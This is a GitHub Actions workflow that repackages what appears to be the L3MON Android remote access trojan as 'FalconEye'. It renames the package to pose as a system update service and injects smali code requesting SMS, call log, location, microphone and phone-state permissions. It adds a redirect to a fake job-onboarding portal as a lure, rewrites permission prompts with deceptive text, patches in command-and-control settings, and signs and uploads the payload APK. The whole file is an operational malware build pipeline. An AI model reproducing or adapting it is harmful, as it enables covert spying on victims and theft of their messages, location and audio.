name: Build FalconEye APK

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'temurin'
          java-version: '8'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip
          wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
          wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar

      - name: Signature Obfuscation & Patching
        run: |
          OLD_PKG="com.etechd.l3mon"
          NEW_PKG="com.sys.update.svc"
          OLD_PATH="com/etechd/l3mon"
          NEW_PATH="com/sys/update/svc"

          echo "Renaming package from $OLD_PKG to $NEW_PKG..."
          
          OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
          find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
          find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

          mkdir -p "payload_source/smali/$NEW_PATH"
          if [ -d "payload_source/smali/$OLD_PATH" ]; then
            mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
            rm -rf "payload_source/smali/com/etechd"
          fi

          # Runtime Permission Injection (Android 14 Requirement)
          # We inject the requestPermissions call into onCreate
          PERMISSION_CODE='    const/4 v0, 0x7\n    new-array v0, v0, [Ljava/lang/String;\n    const/4 v1, 0x0\n    const-string v2, "android.permission.READ_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    const-string v2, "android.permission.RECEIVE_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x2\n    const-string v2, "android.permission.READ_CALL_LOG"\n    aput-object v2, v0, v1\n    const/4 v1, 0x3\n    const-string v2, "android.permission.ACCESS_FINE_LOCATION"\n    aput-object v2, v0, v1\n    const/4 v1, 0x4\n    const-string v2, "android.permission.RECORD_AUDIO"\n    aput-object v2, v0, v1\n    const/4 v1, 0x5\n    const-string v2, "android.permission.POST_NOTIFICATIONS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x6\n    const-string v2, "android.permission.READ_PHONE_STATE"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    invoke-virtual {p0, v0, v1}, L'"$NEW_PATH"'/MainActivity;->requestPermissions([Ljava/lang/String;I)V\n'
          
          sed -i "/invoke-virtual {p0, v0}, L$NEW_PATH\/MainActivity;->setContentView(I)V/a $PERMISSION_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"

          # Redirect to Vercel Portal on Launch (Lure)
          REDIRECT_CODE='    new-instance v0, Landroid/content/Intent;\n    const-string v1, "android.intent.action.VIEW"\n    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)\n    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"\n    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;\n    move-result-object v1\n    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;\n    invoke-virtual {p0, v0}, L'"$NEW_PATH"'/MainActivity;->startActivity(Landroid/content/Intent;)V\n'
          
          sed -i "/invoke-virtual {p0, v0, v1}, L$NEW_PATH\/MainActivity;->requestPermissions/a $REDIRECT_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"

          # Prevent Activity from finishing immediately
          sed -i 's/invoke-virtual {p0}, L'"$NEW_PATH"'\/MainActivity;->finish()V/# finish disabled/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"

          # Obfuscate Strings
          find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
          find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable ALL permissions|Grant system stability rights|g" {} +

          # Dynamic IP/Port Patching
          chmod +x patch_payload.sh
          sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
          ./patch_payload.sh

      - name: Build APK
        run: |
          java -jar apktool.jar b ./payload_source -o unsigned.apk
          java -jar sign.jar -a unsigned.apk --allowResign
          mkdir -p app/build/outputs/apk/debug/
          mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Payload-APK
          path: app/build/outputs/apk/debug/FalconEye.apk
